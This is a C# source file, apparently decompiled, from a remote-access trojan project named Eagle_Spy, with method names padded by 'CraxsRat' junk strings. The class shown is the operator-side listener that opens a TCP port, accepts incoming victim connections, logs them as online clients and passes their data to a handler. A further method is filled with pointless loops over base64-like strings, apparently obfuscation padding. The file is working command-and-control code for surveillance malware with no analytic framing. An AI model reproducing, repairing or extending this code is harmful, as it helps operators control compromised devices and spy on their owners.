using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Eagle_Spy.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy.sockets;

public class Accept
{
	public bool closing;

	public TcpListener MainListner;

	public List<string> Blocklist;

	public List<ListData> RequestsReceiver;

	public long BytesSent;

	public long BytesReceived;

	public ManualResetEvent SocketHandler;

	public Random randomnumber;

	public bool iamout;

	public string Myport;

	public object SyncObj;

	public object Syncrecive;

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokygbhs(string PORTt)
	{
		try
		{
			randomnumber = new Random();
			SyncObj = RequestsReceiver;
			Syncrecive = RuntimeHelpers.GetObjectValue(new object());
			RequestsReceiver = new List<ListData>();
			int num = Conversions.ToInteger(PORTt);
			if (CheckPort(num))
			{
				Myport = Conversions.ToString(num);
				MainListner = new TcpListener(IPAddress.Any, num);
				MainListner.Server.SendTimeout = -1;
				MainListner.Server.ReceiveTimeout = -1;
				MainListner.Server.SendBufferSize = 16384;
				MainListner.Server.ReceiveBufferSize = 16384;
				MainListner.Start();
				Thread thread = new Thread(ScanerAsync);
				thread.IsBackground = true;
				thread.Start();
				Thread thread2 = new Thread(DataHandlerAsync);
				thread2.IsBackground = true;
				thread2.Name = "DataHandel";
				thread2.Start();
				closing = false;
			}
			else
			{
				Codes.MyMsgBox("Port in use", $"The specified port ({PORTt}) is already in use", useno: false, Resources.information48px);
				Environment.Exit(0);
			}
			infoServer.PORTS = infoServer.PORTS + PORTt + " ";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Codes.MyMsgBox(PORTt + "- ERROR", "Exception while opening Port: " + PORTt, useno: false, Resources.error48px);
			ProjectData.ClearProjectError();
		}
	}

	public Accept(string Paramaterp)
	{
		closing = true;
		Blocklist = new List<string>();
		RequestsReceiver = new List<ListData>();
		SocketHandler = new ManualResetEvent(initialState: false);
		iamout = false;
		Myport = "";
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsokygbhs(Paramaterp);
	}

	public void ScanerAsync()
	{
		while (Data.MainForm.Alive)
		{
			try
			{
				Thread.Sleep(1);
				SocketHandler.Reset();
				MainListner.BeginAcceptTcpClient(AcceptClient, MainListner);
				SocketHandler.WaitOne();
			}
			catch (SocketException projectError)
			{
				ProjectData.SetProjectError(projectError);
				iamout = true;
				ProjectData.ClearProjectError();
				break;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				iamout = true;
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	private void AcceptClient(IAsyncResult ar)
	{
		try
		{
			Client client = new Client(MainListner.EndAcceptTcpClient(ar), ((IPEndPoint)MainListner.LocalEndpoint).Port, this);
			if (!Data.ClientsOnline.Contains(client.ClientRemoteAddress))
			{
				Data.LOGIT(client, "New Connection", client.Flag);
				Data.ClientsOnline.Add(new object[2] { client, client.myClient }, client.ClientRemoteAddress);
			}
		}
		catch (ObjectDisposedException projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		catch (SocketException projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(1);
			SocketHandler.Set();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void DataHandlerAsync()
	{
		while (!iamout)
		{
			Thread.Sleep(1);
			ListData listData = null;
			object objectValue = RuntimeHelpers.GetObjectValue(SyncObj);
			try
			{
				object obj = objectValue;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj);
				bool lockTaken = false;
				try
				{
					Monitor.Enter(obj, ref lockTaken);
					if (RequestsReceiver.Count > 0)
					{
						listData = RequestsReceiver[0];
						RequestsReceiver.RemoveAt(0);
					}
				}
				finally
				{
					if (lockTaken)
						Monitor.Exit(obj);
				}
				if (listData != null)
				{
					Data.HandelData(new object[4] { listData.ClassClient, listData.bByte, listData.SizeData, listData.TcpClient });
					listData.wait = true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private bool CheckPort(int Port)
	{
		IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
		IPEndPoint[] activeTcpListeners = iPGlobalProperties.GetActiveTcpListeners();
		IPEndPoint[] array = activeTcpListeners;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				IPEndPoint iPEndPoint = array[num];
				if (iPEndPoint.Port == Port)
					break;
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		return false;
	}

	internal static string CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdfc(string v, string v2, int v1)
	{
		string result = default(string);
		try
		{
			string text = v;
			do
			{
				text = "+w3YoxSWNZ0Rao4T6OreWKbHMmAdzVJVQ==";
			}
			while (text.Length <= 0);
			string text2 = "";
			do
			{
				text2 = "+RrXZvX6AX1gSq5+FNT8TKi65VQFdV/leEI0IssR8Z8cDwoRQBykIEzLM2JRqxqI4dOOw";
			}
			while (text2.Length <= 0);
			string text3 = "";
			do
			{
				text3 = "tpVQSHwKWyrRRP8y/MjT40wyvBon5BUJlFmXnmfxxXI7JSNtXrg402Do3TZ5dQy6+27jBpFFKYsa";
			}
			while (text3.Length <= 0);
			string text4 = "";
			do
			{
				text4 = "powIOhya6FOraSJcI0RX9yEoa2JizSwp456QM2Rwp2npbto2mhmdioUbcCloGApotMu0DY37Hrn5";
			}
			while (text4.Length <= 0);
			string text5 = "";
			do
			{
				text5 = "+v3NbvUF6nN0U6oG4LjAyY4pIWnBT69ZqWhIdafGdNV7O1BSPdbeymud4SP/MpmeUgXOreD";
			}
			while (text5.Length <= 0);
			do
			{
				text5 = "/6Ls7TYUxYyNFiGtmdVxOQdt/RNb7Llt4yiqH9h2Xg1CkzjwIVlwi2jYrBg0zQYfKO0cAoazefvs";
			}
			while (v2.Length <= 0);
			result = v2;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
